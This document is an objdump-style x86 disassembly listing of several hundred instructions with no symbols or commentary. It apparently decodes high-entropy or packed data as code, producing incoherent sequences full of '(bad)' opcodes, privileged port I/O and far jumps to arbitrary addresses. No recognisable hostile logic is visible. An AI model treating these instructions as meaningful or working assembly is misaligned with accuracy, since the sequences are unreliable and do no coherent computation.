  40e243:	adc    BYTE PTR [esi-0x20895d70],dl
  40e249:	jmp    0x98fede70
  40e24e:	test   eax,0x36c16dc1
  40e253:	out    dx,eax
  40e254:	in     eax,dx
  40e255:	leave  
  40e256:	jne    0x40e22b
  40e258:	(bad)  
  40e259:	ss jecxz 0x40e2c7
  40e25c:	pop    ebx
  40e25d:	add    BYTE PTR ds:0x9022e6e9,bh
  40e263:	mov    cl,0xf2
  40e265:	pop    ss
  40e266:	and    ch,BYTE PTR [edi+0x43]
  40e269:	sub    DWORD PTR [esi],edx
  40e26b:	das    
  40e26c:	sub    al,0x11
  40e26e:	jg     0x40e2cd
  40e270:	add    al,0xeb
  40e272:	test   eax,0x993e2151
  40e277:	or     eax,0xb4cb1848
  40e27c:	pop    esi
  40e27d:	cli    
  40e27e:	cld    
  40e27f:	sub    al,0xf2
  40e281:	enter  0x400d,0x3a
  40e285:	add    esi,eax
  40e287:	and    cl,BYTE PTR [edi+0x3e]
  40e28a:	ret    0x59b5
  40e28d:	xor    cl,BYTE PTR [esi]
  40e28f:	sub    al,0x6
  40e291:	ret    0x28c4
  40e294:	mov    esi,0xa3cbf1f6
  40e299:	or     ch,cl
  40e29b:	cdq    
  40e29c:	das    
  40e29d:	mov    ebp,DWORD PTR [edx]
  40e29f:	test   al,0x7c
  40e2a1:	inc    esi
  40e2a2:	jge    0x40e2f4
  40e2a4:	stos   BYTE PTR es:[edi],al
  40e2a5:	push   esi
  40e2a6:	add    BYTE PTR [esi-0x64],bl
  40e2a9:	inc    ebp
  40e2aa:	add    BYTE PTR [edx+0x40],bl
  40e2ad:	fst    QWORD PTR [edi+edx*4+0x3a26e829]
  40e2b4:	xor    al,bh
  40e2b6:	and    ah,BYTE PTR [eax+0x7c]
  40e2b9:	xchg   DWORD PTR [ebp-0xfd78b74],ecx
  40e2bf:	pop    esp
  40e2c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2c1:	cwde   
  40e2c2:	push   ds
  40e2c3:	pop    es
  40e2c4:	dec    ebp
  40e2c5:	xchg   BYTE PTR [ecx-0x1b699ae0],dl
  40e2cb:	cmp    eax,0xc2527959
  40e2d0:	pushf  
  40e2d1:	push   ss
  40e2d2:	rcl    DWORD PTR [ebx],1
  40e2d4:	sub    BYTE PTR [edi+ebx*8-0x10],al
  40e2d8:	xchg   esp,eax
  40e2d9:	inc    esp
  40e2da:	aas    
  40e2db:	pop    esi
  40e2dc:	or     BYTE PTR [esi-0x5b],al
  40e2df:	cli    
  40e2e0:	adc    cl,BYTE PTR [ebx+0xf70a6]
  40e2e6:	cdq    
  40e2e7:	std    
  40e2e8:	daa    
  40e2e9:	dec    esi
  40e2ea:	or     al,0xcb
  40e2ec:	dec    ecx
  40e2ed:	mov    edx,0xf1e2ca6d
  40e2f2:	cwde   
  40e2f3:	mov    ah,0x9b
  40e2f5:	push   ss
  40e2f6:	xchg   ebp,eax
  40e2f7:	mov    ds:0x844a6a6b,eax
  40e2fc:	mov    edi,0x2e27dca2
  40e301:	and    ebx,ebx
  40e303:	fistp  WORD PTR [ebp+0x10]
  40e306:	rcl    BYTE PTR [edi+0x5e],0x19
  40e30a:	xchg   ebx,eax
  40e30b:	ins    BYTE PTR es:[edi],dx
  40e30c:	shl    DWORD PTR [ebp-0x15],0x2b
  40e310:	jo     0x40e2ff
  40e312:	lahf   
  40e313:	mov    cs,WORD PTR [ebx+0x12983982]
  40e319:	add    dh,BYTE PTR [ebx]
  40e31b:	push   es
  40e31c:	out    dx,al
  40e31d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e31e:	add    BYTE PTR [esp+eax*1-0x1d],ch
  40e322:	fbstp  TBYTE PTR ss:[esi+0x62]
  40e326:	xchg   esp,eax
  40e327:	imul   ebp,DWORD PTR [eax],0xad39374c
  40e32d:	add    ah,dl
  40e32f:	mov    edx,DWORD PTR [edi]
  40e331:	(bad)  
  40e332:	js     0x40e347
  40e334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e335:	push   ds
  40e336:	aas    
  40e337:	and    BYTE PTR [ecx-0x69a9eb33],ch
  40e33d:	int3   
  40e33e:	and    edx,DWORD PTR [edi]
  40e340:	xor    ah,dl
  40e342:	xchg   ebp,eax
  40e343:	lea    ecx,[esi+0x7f]
  40e346:	pop    esp
  40e347:	sahf   
  40e348:	arpl   WORD PTR [ecx],ax
  40e34a:	fucomp st(4)
  40e34c:	xchg   edx,eax
  40e34d:	pop    esp
  40e34e:	or     DWORD PTR ds:0xa580b76a,eax
  40e354:	rcr    BYTE PTR [eax+0xd],0x28
  40e358:	(bad)  
  40e359:	pop    ebx
  40e35a:	and    BYTE PTR [edi],al
  40e35c:	mov    edi,0x35f02950
  40e361:	out    dx,al
  40e362:	adc    eax,0x2e456eb8
  40e367:	cmp    cl,BYTE PTR [edi-0x3b]
  40e36a:	and    eax,0xcfeb40a2
  40e36f:	xchg   esi,eax
  40e370:	shl    DWORD PTR [edx-0x26061074],cl
  40e376:	cwde   
  40e377:	pop    ebx
  40e378:	pop    ebp
  40e379:	or     DWORD PTR [edi-0x33],ecx
  40e37c:	pop    esp
  40e37d:	sbb    al,0xbc
  40e37f:	cli    
  40e380:	xchg   edi,eax
  40e381:	jmp    0xffa743d8
  40e386:	ins    DWORD PTR es:[edi],dx
  40e387:	mov    gs,WORD PTR [esi+eax*2+0x14]
  40e38b:	rcl    dh,0x6c
  40e38e:	dec    ebp
  40e38f:	cwde   
  40e390:	imul   ebx,ebp,0x5cdc6b78
  40e396:	lahf   
  40e397:	push   cs
  40e398:	std    
  40e399:	in     eax,0xde
  40e39b:	mov    edx,0x395f7300
  40e3a0:	sub    DWORD PTR [eax+eiz*1+0x43],eax
  40e3a4:	pop    esp
  40e3a5:	push   esp
  40e3a6:	add    BYTE PTR [edi-0x12],cl
  40e3a9:	mov    cs,eax
  40e3ab:	outs   dx,BYTE PTR ds:[esi]
  40e3ac:	inc    eax
  40e3ad:	mov    ds:0xe49a9081,al
  40e3b2:	out    dx,al
  40e3b3:	xchg   edi,eax
  40e3b4:	push   es
  40e3b5:	lds    esi,FWORD PTR ds:0xcdcf4260
  40e3bb:	imul   DWORD PTR [edx+edx*4]
  40e3be:	iret   
  40e3bf:	dec    ebp
  40e3c0:	jbe    0x40e349
  40e3c2:	add    al,0x19
  40e3c4:	push   eax
  40e3c5:	sub    DWORD PTR [eax],edx
  40e3c7:	mov    esi,0xe894271
  40e3cc:	mov    eax,0x1d86aa00
  40e3d1:	repnz addr16 aas 
  40e3d4:	(bad)  
  40e3d5:	aad    0x2d
  40e3d7:	ins    DWORD PTR es:[edi],dx
  40e3d8:	(bad)  
  40e3d9:	fstp   TBYTE PTR [edi+0x30]
  40e3dc:	pop    ds
  40e3dd:	mov    ecx,0xb67abe4f
  40e3e2:	ins    BYTE PTR es:[edi],dx
  40e3e3:	mov    ah,0xb2
  40e3e5:	jl     0x40e421
  40e3e7:	in     al,0x65
  40e3e9:	or     bh,BYTE PTR [edi-0x726fcda5]
  40e3ef:	ins    BYTE PTR es:[edi],dx
  40e3f0:	dec    esp
  40e3f1:	stos   DWORD PTR es:[edi],eax
  40e3f2:	push   esi
  40e3f3:	arpl   WORD PTR [edi+ecx*8-0x1b19ffaa],di
  40e3fa:	fwait
  40e3fb:	lahf   
  40e3fc:	aaa    
  40e3fd:	lods   eax,DWORD PTR ds:[esi]
  40e3fe:	pushf  
  40e3ff:	outs   dx,BYTE PTR ds:[esi]
  40e400:	dec    ebp
  40e401:	test   eax,0xb7588cfb
  40e406:	jp     0x40e47b
  40e408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e409:	pop    edx
  40e40a:	lock xchg esi,esp
  40e40d:	cmp    al,BYTE PTR [ebp+0x70ffe752]
  40e413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e414:	mov    esp,0x81da3e27
  40e419:	pop    ds
  40e41a:	mov    ebp,0xfef50a7b
  40e41f:	mov    cl,0x74
  40e421:	mov    eax,0x65fb6f4f
  40e426:	out    0xdb,al
  40e428:	adc    eax,0xf4b13c81
  40e42d:	je     0x40e3ce
  40e42f:	mov    ds,WORD PTR [esi+0x7174ac8]
  40e435:	loope  0x40e4ae
  40e437:	jo     0x40e405
  40e439:	cdq    
  40e43a:	adc    ecx,ecx
  40e43c:	add    ch,BYTE PTR [ebp*2+0x377fdec6]
  40e443:	js     0x40e4b0
  40e445:	xchg   ebx,eax
  40e446:	ja     0x40e42e
  40e448:	pop    eax
  40e449:	cwde   
  40e44a:	test   BYTE PTR [edi+0x2d47dd],bl
  40e450:	mov    ebp,0xb46cbf46
  40e455:	sub    al,BYTE PTR fs:[eax]
  40e458:	adc    esi,esi
  40e45a:	fbld   TBYTE PTR [ecx+0x6f1f0bd7]
  40e461:	push   eax
  40e462:	mov    bh,0x4d
  40e464:	sub    esi,esi
  40e466:	lahf   
  40e467:	or     ah,BYTE PTR [eax+0x7a9db529]
  40e46d:	fiadd  WORD PTR [esp+edx*1-0x21]
  40e471:	dec    ecx
  40e472:	xor    ebp,edx
  40e474:	out    dx,eax
  40e475:	pop    eax
  40e476:	fst    QWORD PTR [eax-0x26cfbb2]
  40e47c:	and    BYTE PTR [edi],ah
  40e47e:	xchg   DWORD PTR [eax+esi*8-0x65],eax
  40e482:	push   edx
  40e483:	mov    edi,0x835b5953
  40e488:	jg     0x40e465
  40e48a:	pop    esp
  40e48b:	call   0x12a8b3a0
  40e490:	clc    
  40e491:	retf   0x9099
  40e494:	sub    BYTE PTR [edx],al
  40e496:	ss mov edx,0xdf5b448d
  40e49c:	jg     0x40e4d3
  40e49e:	mov    BYTE PTR [edi-0x64],cl
  40e4a1:	jb     0x40e4b3
  40e4a3:	pop    ss
  40e4a4:	sub    edx,DWORD PTR [ebp+0x3d]
  40e4a7:	jns    0x40e511
  40e4a9:	retf   0x72b5
  40e4ac:	aam    0x6c
  40e4ae:	enter  0x1cc8,0xbf
  40e4b2:	fnstcw WORD PTR [eax-0x51264cdf]
  40e4b8:	mov    cs,ecx
  40e4ba:	add    DWORD PTR [edi+ebp*1],ebp
  40e4bd:	pop    es
  40e4be:	xchg   esi,eax
  40e4bf:	fdivr  QWORD PTR [esi+0x69e48904]
  40e4c5:	in     al,dx
  40e4c6:	fstp   DWORD PTR [edx-0x7c]
  40e4c9:	jne    0x40e462
  40e4cb:	xchg   ebp,eax
  40e4cc:	mov    cl,BYTE PTR [eax+edx*2+0x4d1fec01]
  40e4d3:	mov    ds:0x318c5bd5,al
  40e4d8:	jg     0x40e52c
  40e4da:	ret    0x9a7e
  40e4dd:	and    BYTE PTR [edi-0x5f],ah
  40e4e0:	push   edi
  40e4e1:	es cli 
  40e4e3:	les    edx,FWORD PTR ds:0x62c8fffc
  40e4e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ea:	and    BYTE PTR [eax],cl
  40e4ec:	sbb    ebx,ebp
  40e4ee:	add    DWORD PTR [edx+0x1864ba80],edx
  40e4f4:	add    eax,0xa26777ff
  40e4f9:	js     0x40e4f6
  40e4fb:	sbb    al,0x65
  40e4fd:	fs das 
  40e4ff:	add    BYTE PTR [esi-0x49],bh
  40e502:	mov    bl,0x0
  40e504:	xchg   edi,eax
  40e505:	inc    bh
  40e507:	push   es
  40e508:	adc    al,0x2c
  40e50a:	push   0x72bfe40
  40e50f:	icebp  
  40e510:	retf   0xdb9d
  40e513:	pushfw 
  40e515:	mov    al,ds:0x7a85bb6d
  40e51a:	sahf   
  40e51b:	pop    es
  40e51c:	in     eax,dx
  40e51d:	mov    al,BYTE PTR [eax+0x66]
  40e520:	(bad)  
  40e521:	ins    BYTE PTR es:[edi],dx
  40e522:	and    dh,BYTE PTR [eax+0x5e3b7529]
  40e528:	pop    ecx
  40e529:	mov    gs,edx
  40e52b:	cmp    DWORD PTR [esi],ebx
  40e52d:	cmp    ebp,esi
  40e52f:	xchg   esi,edi
  40e531:	cmp    ebp,DWORD PTR ds:0x598ff33a
  40e537:	(bad)  
  40e539:	inc    esp
  40e53a:	pop    edi
  40e53b:	lods   eax,DWORD PTR ds:[esi]
  40e53c:	or     BYTE PTR [edx],bh
  40e53e:	sub    eax,0x31a9b2d7
  40e543:	push   esp
  40e544:	aad    0x96
  40e546:	dec    eax
  40e547:	mov    esi,0x31891b00
  40e54c:	pop    edx
  40e54d:	jle    0x40e54e
  40e54f:	sbb    BYTE PTR [edx+0x4],0xff
  40e553:	not    DWORD PTR [ebp-0x44]
  40e556:	icebp  
  40e557:	stos   BYTE PTR es:[edi],al
  40e558:	arpl   cx,di
  40e55a:	pop    ecx
  40e55b:	ins    BYTE PTR es:[edi],dx
  40e55c:	xchg   ebx,eax
  40e55d:	xchg   ebp,eax
  40e55e:	jbe    0x40e55c
  40e560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e561:	xor    DWORD PTR [ecx+0xa],ecx
  40e564:	loop   0x40e524
  40e566:	jns    0x40e59a
  40e568:	sahf   
  40e569:	lods   al,BYTE PTR ds:[esi]
  40e56a:	mov    BYTE PTR [edx],bh
  40e56c:	jg     0x40e5cc
  40e56e:	cmp    esi,ebx
  40e570:	cmc    
  40e571:	stos   DWORD PTR es:[edi],eax
  40e572:	sub    edx,DWORD PTR [ecx]
  40e574:	ds mov ebp,0x4e6f1855
  40e57a:	ins    BYTE PTR es:[edi],dx
  40e57b:	xchg   edi,eax
  40e57c:	call   0x5e43:0xb0091d58
  40e583:	outs   dx,BYTE PTR ds:[esi]
  40e584:	inc    edx
  40e585:	scas   eax,DWORD PTR es:[edi]
  40e586:	pop    ss
  40e587:	mov    ebp,0x9b379f9b
  40e58c:	adc    eax,0x333c8d98
  40e591:	cmp    DWORD PTR [edi*8-0x33f4e441],eax
  40e598:	mov    dh,0x28
  40e59a:	cmc    
  40e59b:	pop    esp
  40e59c:	fist   WORD PTR ds:0x16784275
  40e5a2:	(bad)  
  40e5a4:	test   BYTE PTR cs:[edi],cl
  40e5a7:	mov    esi,0xeb6f88a
  40e5ac:	cld    
  40e5ad:	iret   
  40e5ae:	dec    edi
  40e5af:	dec    esi
  40e5b0:	leave  
  40e5b1:	pop    esi
  40e5b2:	jle    0x40e61e
  40e5b4:	jl     0x40e5ec
  40e5b6:	ins    DWORD PTR es:[edi],dx
  40e5b7:	std    
  40e5b8:	leave  
  40e5b9:	repnz neg DWORD PTR [esp+ebx*1-0x72aa9b3b]
  40e5c1:	test   BYTE PTR [esi-0x1ef33086],dh
  40e5c7:	jmp    0xea96:0xf968a882
  40e5ce:	push   ds
  40e5cf:	hlt    
  40e5d0:	ds xchg edi,eax
  40e5d2:	rol    BYTE PTR [ecx+0x46d4b0ce],0xd4
  40e5d9:	std    
  40e5da:	aaa    
  40e5db:	jecxz  0x40e5b7
  40e5dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5de:	lahf   
  40e5df:	addr16 xor ebx,esi
  40e5e2:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5e4:	mov    ds:0x399f7ac6,eax
  40e5e9:	out    dx,eax
  40e5ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5eb:	nop
  40e5ec:	fist   DWORD PTR [ecx]
  40e5ee:	add    bh,BYTE PTR [ebx-0x24]
  40e5f1:	dec    esp
  40e5f2:	je     0x40e5d4
  40e5f4:	ss push ds
  40e5f6:	mov    esp,0x71b38a5d
  40e5fb:	(bad)  
  40e5fc:	jmp    0x40e624
  40e5fe:	pushf  
  40e5ff:	inc    ebx
  40e600:	pop    edi
  40e601:	std    
  40e602:	and    DWORD PTR [edx+0x5c],0xd7d994af
  40e609:	mov    eax,0xb04a6aa6
  40e60e:	lods   al,BYTE PTR ds:[esi]
  40e60f:	mov    dh,0x28
  40e611:	popf   
  40e612:	loopne 0x40e687
  40e614:	lock mov al,0x43
  40e617:	clc    
  40e618:	(bad)  
  40e619:	adc    al,0xec
  40e61b:	addr16 pop eax
  40e61d:	mov    esp,es
  40e61f:	call   0xb25022be
  40e624:	out    0x94,al
  40e626:	retf   0x3261
  40e629:	adc    edi,DWORD PTR [esi+0x1783d5b3]
  40e62f:	fs dec ebp
  40e631:	cmp    DWORD PTR [ecx-0x65794aee],edx
  40e637:	fwait
  40e638:	fwait
  40e639:	jo     0x40e61c
  40e63b:	jecxz  0x40e638
  40e63d:	in     al,0xf9
  40e63f:	jge    0x40e646
  40e641:	add    eax,0x9e19de38
  40e646:	jne    0x40e5d5
  40e648:	call   0x338788b3
  40e64d:	fsub   QWORD PTR [edi-0x5d]
  40e650:	push   ds
  40e651:	sti    
  40e652:	xor    DWORD PTR [eax-0x1e26fc37],edx
  40e658:	mov    edi,0xa3551765
  40e65d:	call   0x5eb9215c
  40e662:	cmp    ecx,DWORD PTR [ecx]
  40e664:	out    dx,eax
  40e665:	aaa    
  40e666:	cs inc esp
  40e668:	out    dx,eax
  40e669:	xlat   BYTE PTR ds:[ebx]
  40e66a:	(bad)
  40e66e:	pop    edx
  40e66f:	jge    0x40e6df
  40e671:	sbb    al,0x25
  40e673:	sub    DWORD PTR [eax-0x55],ecx
  40e676:	jg     0x40e6d6
  40e678:	arpl   WORD PTR [ecx+0x7964dda0],si
  40e67e:	mov    DWORD PTR [edi+ebx*4+0x6d811741],ebx
  40e685:	inc    edi
  40e686:	scas   eax,DWORD PTR es:[edi]
  40e687:	arpl   WORD PTR [ebx+ebx*1],ax
  40e68a:	xchg   esp,eax
  40e68b:	in     eax,0xf
  40e68d:	sub    DWORD PTR ds:0x2797ccb0,eax
  40e693:	imul   eax,ebx,0x36f8f57e
  40e699:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e69a:	sbb    al,0x74
  40e69c:	jmp    0x13c1111e
  40e6a1:	dec    ebp
  40e6a2:	or     eax,0x1f3a5928
  40e6a7:	cmp    DWORD PTR gs:0xad980112,esp
  40e6ae:	push   ss
  40e6af:	mov    al,ds:0x5c3236bd
  40e6b4:	add    BYTE PTR [edi],dh
  40e6b6:	(bad)  
  40e6b7:	out    0x16,eax
  40e6b9:	add    eax,0xc9a0ade0
  40e6be:	(bad)  
  40e6bf:	mov    esi,0x6eac02b2
  40e6c4:	push   cs
  40e6c5:	pusha  
  40e6c6:	cli    
  40e6c7:	mov    dl,0x7a
  40e6c9:	mov    ah,0x5e
  40e6cb:	pop    ebp
  40e6cc:	or     bh,cl
  40e6ce:	mov    bh,0x5f
  40e6d0:	xchg   bh,ah
  40e6d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6d3:	sbb    BYTE PTR [esi+0x68],bl
  40e6d6:	popf   
  40e6d7:	sub    ecx,ecx
  40e6d9:	inc    ecx
  40e6da:	jg     0x40e6f5
  40e6dc:	dec    esi
  40e6dd:	or     cl,BYTE PTR [edx]
  40e6df:	pusha  
  40e6e0:	fwait
  40e6e1:	jnp    0x40e686
  40e6e3:	mov    bl,0xdc
  40e6e5:	inc    esp
  40e6e6:	clc    
  40e6e7:	adc    eax,0xff932794
  40e6ec:	out    0x4d,eax
  40e6ee:	repz mov al,0xe7
  40e6f1:	inc    esp
  40e6f2:	outs   dx,BYTE PTR ds:[esi]
  40e6f3:	mov    edx,0xe46e96cc
  40e6f8:	add    esi,DWORD PTR [edx+0x2b]
  40e6fb:	pop    es
  40e6fc:	icebp  
  40e6fd:	clc    
  40e6fe:	jmp    0x40e77e
  40e700:	add    DWORD PTR [ecx-0x8f85b3f],0x4252a97c
  40e70a:	pop    esi
  40e70b:	jns    0x40e71c
  40e70d:	pushf  
  40e70e:	xchg   bh,dh
  40e710:	aaa    
  40e711:	adc    esp,edx
  40e713:	add    dh,BYTE PTR [eax+eiz*2-0x5a]
  40e717:	jg     0x40e77c
  40e719:	mov    ds:0x63b83700,eax
  40e71e:	das    
  40e71f:	fs aaa 
  40e721:	sub    ebp,edi
  40e723:	jne    0x40e71e
  40e725:	sahf   
  40e726:	sbb    ah,BYTE PTR [edx+ebp*1+0x13]
  40e72a:	std    
  40e72b:	ficomp WORD PTR [edx]
  40e72d:	mov    eax,0xd6d025b
  40e732:	mov    ah,0xc2
  40e734:	cwde   
  40e735:	outs   dx,BYTE PTR ds:[esi]
  40e736:	sub    BYTE PTR [ebp+ebx*8-0x33],al
  40e73a:	xchg   edi,eax
  40e73b:	mov    ds:0x213286e8,al
  40e740:	push   0xffffff88
  40e742:	sbb    BYTE PTR [eax],0xa
  40e745:	gs loop 0x40e75b
  40e748:	std    
  40e749:	jge    0x40e708
  40e74b:	rol    DWORD PTR [edi-0x60dddedf],1
  40e751:	ficom  WORD PTR [eax+0x71]
  40e754:	pop    edx
  40e755:	sbb    DWORD PTR [eax+ebp*2-0x1f1d37f7],ebp
  40e75c:	mov    esi,0x2193667f
  40e761:	xor    dl,BYTE PTR [ebx-0x42cace24]
  40e767:	mov    esi,0x360fb366
  40e76c:	fucomi st,st(7)
  40e76e:	xchg   BYTE PTR [esp+ebp*8-0x47],ch
  40e772:	xlat   BYTE PTR ds:[ebx]
  40e773:	fist   WORD PTR [ebp-0x6d]
  40e776:	cli    
  40e777:	sub    eax,0x7bea211b
  40e77c:	push   ebx
  40e77d:	clc    
  40e77e:	imul   ecx,DWORD PTR [edi+eiz*8+0x13ff529b],0x1
  40e786:	lods   al,BYTE PTR ds:[esi]
  40e787:	dec    edi
  40e788:	jno    0x40e78a
  40e78a:	imul   DWORD PTR [eax+0x45a9b6be]
  40e790:	pushf  
  40e791:	lods   eax,DWORD PTR ds:[esi]
  40e792:	test   bl,bh
  40e794:	jge    0x40e760
  40e796:	jmp    0x6aae:0x4c314285
  40e79d:	lds    ebx,FWORD PTR [ebx-0x36]
  40e7a0:	sbb    DWORD PTR [esi+0x1e],esp
  40e7a3:	mov    esp,0x4277dae
  40e7a8:	cwde   
  40e7a9:	add    cl,0xdf
  40e7ac:	mov    eax,0xe51045a3
  40e7b1:	imul   dh
  40e7b3:	or     DWORD PTR [ecx],ecx
  40e7b5:	std    
  40e7b6:	jno    0x40e7f5
  40e7b8:	adc    BYTE PTR [ecx],ch
  40e7ba:	push   0xc51b8fe2
  40e7bf:	fmulp  st(4),st
  40e7c1:	sub    dl,BYTE PTR [edi+esi*2]
  40e7c4:	sbb    BYTE PTR [eax+eax*8-0x21],0xee
  40e7c9:	jae    0x40e779
  40e7cb:	nop
  40e7cc:	xchg   ecx,eax
  40e7cd:	xchg   BYTE PTR [ebx],al
  40e7cf:	inc    ebx
  40e7d0:	cdq    
  40e7d1:	popa   
  40e7d2:	ror    DWORD PTR [esi],1
  40e7d4:	xchg   edi,eax
  40e7d5:	icebp  
  40e7d6:	jno    0x40e7e3
  40e7d8:	cmc    
  40e7d9:	call   0x6600:0xff932011
  40e7e0:	sub    al,BYTE PTR [eax]
  40e7e2:	rcr    DWORD PTR [eax+0x6a],cl
  40e7e5:	test   DWORD PTR [edi-0x8],ecx
  40e7e8:	fild   QWORD PTR [edx-0x7a976452]
  40e7ee:	sbb    al,0x50
  40e7f0:	in     al,dx
  40e7f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7f2:	or     esi,eax
  40e7f4:	sar    BYTE PTR [edi],cl
  40e7f6:	cmp    ebx,ebx
  40e7f8:	ret    0xadb9
  40e7fb:	popf   
  40e7fc:	or     ah,BYTE PTR [eax+0x5e]
  40e7ff:	rol    BYTE PTR [edi-0x3d1c5f4a],0x30
  40e806:	pop    es
  40e807:	adc    BYTE PTR [esi],0x5d
  40e80a:	adc    al,BYTE PTR [eax+0x6a601ad4]
  40e810:	lock (bad) 
  40e812:	mov    al,ds:0xd323fe73
  40e817:	sbb    BYTE PTR [ecx+0x5c],0x67
  40e81b:	jp     0x40e851
  40e81d:	xchg   cl,ah
  40e81f:	and    ch,BYTE PTR [edi]
  40e821:	(bad)  
  40e822:	mov    WORD PTR [ecx],?
  40e824:	lahf   
  40e825:	stc    
  40e826:	add    eax,0x1cdd4a2b
  40e82b:	rcr    BYTE PTR [ecx-0x50d88d70],0x2a
  40e832:	inc    edx
  40e833:	fld    QWORD PTR [ebp-0x5ec06e75]
  40e839:	push   ds
  40e83a:	inc    edi
  40e83c:	adc    esp,edi
  40e83e:	lods   al,BYTE PTR ds:[esi]
  40e83f:	add    esp,DWORD PTR [eax-0x31]
  40e842:	pop    edi
  40e843:	push   es
  40e844:	pop    es
  40e845:	sar    BYTE PTR [edi+0x74],0x2a
  40e849:	mov    al,0x5b
  40e84b:	add    al,0x40
  40e84d:	sub    eax,DWORD PTR [ecx+0x746cb2a2]
  40e853:	xor    eax,0xa8020995
  40e858:	pop    edx
  40e859:	pop    edi
  40e85a:	mov    eax,ebp
  40e85c:	mov    bh,0xfb
  40e85e:	and    al,0x1
  40e860:	mov    eax,ds:0x46bf23e0
  40e865:	in     al,0x6d
  40e867:	test   DWORD PTR [edx+0x1007c802],eax
  40e86d:	mov    dl,0xd6
  40e86f:	dec    esp
  40e870:	mov    edi,cr7
  40e873:	xchg   esi,eax
  40e874:	in     eax,0xb2
  40e876:	loopne 0x40e833
  40e878:	xchg   DWORD PTR [ebx+0x68],esp
  40e87b:	pop    ebp
  40e87c:	push   esi
  40e87d:	sub    bh,BYTE PTR [esi+0x51]
  40e880:	mov    al,0xb2
  40e882:	dec    esp
  40e883:	fadd   QWORD PTR [ebx-0x56b93666]
  40e889:	cwde   
  40e88a:	mov    ds:0xd0b101a3,eax
  40e88f:	and    esp,esi
  40e891:	aas    
  40e892:	adc    ebp,eax
  40e894:	sbb    edx,0x97543432
  40e89a:	loop   0x40e831
  40e89c:	mov    esi,0xc3f37c09
  40e8a1:	mov    ch,0x8
  40e8a3:	jl     0x40e885
  40e8a5:	add    ah,bh
  40e8a7:	mov    ch,BYTE PTR [edi-0x3]
  40e8aa:	cmp    esi,esi
  40e8ac:	outs   dx,BYTE PTR ds:[esi]
  40e8ad:	shld   DWORD PTR [esi],esp,cl
  40e8b0:	cmp    DWORD PTR [ebx-0xf],esi
  40e8b3:	mov    ebx,0x62e71d11
  40e8b8:	repnz dec ebp
  40e8ba:	lea    ebp,[eax+0x32]
  40e8bd:	sti    
  40e8be:	outs   dx,BYTE PTR ds:[esi]
  40e8bf:	or     eax,esp
  40e8c1:	hlt    
  40e8c2:	jns    0x40e925
  40e8c4:	mov    ebp,0xec4be6df
  40e8c9:	(bad)  
  40e8ca:	mov    eax,es:0x2b4377b6
  40e8d0:	outs   dx,BYTE PTR ds:[esi]
  40e8d1:	(bad)  
  40e8d2:	in     al,dx
  40e8d3:	inc    edi
  40e8d4:	adc    DWORD PTR [edi+0x3c],ebp
  40e8d7:	mov    WORD PTR [edx-0x1b1d77f],es
  40e8dd:	in     al,0x35
  40e8df:	inc    ecx
  40e8e0:	dec    esp
  40e8e1:	and    al,0x55
  40e8e3:	pop    ecx
  40e8e4:	in     eax,0x27
  40e8e6:	retf   
  40e8e7:	pop    ds
  40e8e8:	les    esp,FWORD PTR [eax-0x5e]
  40e8eb:	dec    edx
  40e8ec:	(bad)  
  40e8ed:	fdiv   QWORD PTR [esp+edi*8+0x70eacb5d]
  40e8f4:	(bad)  
  40e8f5:	js     0x40e936
  40e8f7:	mov    dh,BYTE PTR [esi]
  40e8f9:	and    sp,si
  40e8fc:	jge    0x40e8d3
  40e8fe:	outs   dx,DWORD PTR ds:[esi]
  40e8ff:	in     eax,0xfb
  40e901:	mov    bh,0x19
  40e903:	or     edi,DWORD PTR [edx+0x37609ac3]
  40e909:	and    DWORD PTR [edi-0x4e4626b],esi
  40e90f:	pop    ds
  40e910:	mov    ah,0x9e
  40e912:	add    esi,DWORD PTR [edx]
  40e914:	lods   eax,DWORD PTR ds:[esi]
  40e915:	mov    esp,0xeb6c2289
  40e91a:	fisttp WORD PTR [ebx-0x224f9eb4]
  40e920:	(bad)  
  40e921:	push   ebp
  40e922:	push   esp
  40e923:	add    BYTE PTR [esp+ebp*2],dh
  40e926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e927:	pop    ecx
  40e928:	add    BYTE PTR [eax],0xb8
  40e92b:	jae    0x40e8be
  40e92d:	fcomip st,st(5)
  40e92f:	shl    DWORD PTR [ebp-0x537b4e82],1
  40e935:	lock retf 
  40e937:	sbb    eax,0xce23c370
  40e93c:	adc    DWORD PTR [eax-0x46],esi
  40e93f:	sbb    ch,dh
  40e941:	mov    ch,0x2d
  40e943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e944:	js     0x40e9ac
  40e946:	xor    BYTE PTR [edx-0x2bf13c1d],cl
  40e94c:	addr16 sahf 
  40e94e:	cmp    al,0x61
  40e950:	push   esi
  40e952:	out    dx,al
  40e953:	test   BYTE PTR [edx+0x6],dl
  40e956:	push   ds
  40e957:	and    DWORD PTR [edx-0x29],edx
  40e95a:	int3   
  40e95b:	cdq    
  40e95c:	adc    al,0x2
  40e95e:	sbb    DWORD PTR ds:0xa1ef20a,esp
  40e964:	cmp    DWORD PTR [esi],ebp
  40e966:	inc    eax
  40e967:	push   ecx
  40e968:	push   ss
  40e969:	mov    dh,0xb9
  40e96b:	push   esp
  40e96c:	inc    edi
  40e96d:	xor    ch,BYTE PTR [edi+0x26]
  40e970:	mul    ecx
  40e972:	es in  al,dx
  40e974:	neg    BYTE PTR [ebx+edi*4-0x1352dc53]
  40e97b:	call   0xbfe1:0x8de1190c
  40e982:	(bad)  
  40e983:	out    dx,eax
  40e984:	pop    esi
  40e985:	or     edi,ebp
  40e987:	scas   eax,DWORD PTR es:[edi]
  40e988:	lahf   
  40e989:	xchg   edi,eax
  40e98a:	xlat   BYTE PTR ds:[ebx]
  40e98b:	cdq    
  40e98c:	enter  0xfb96,0xf5
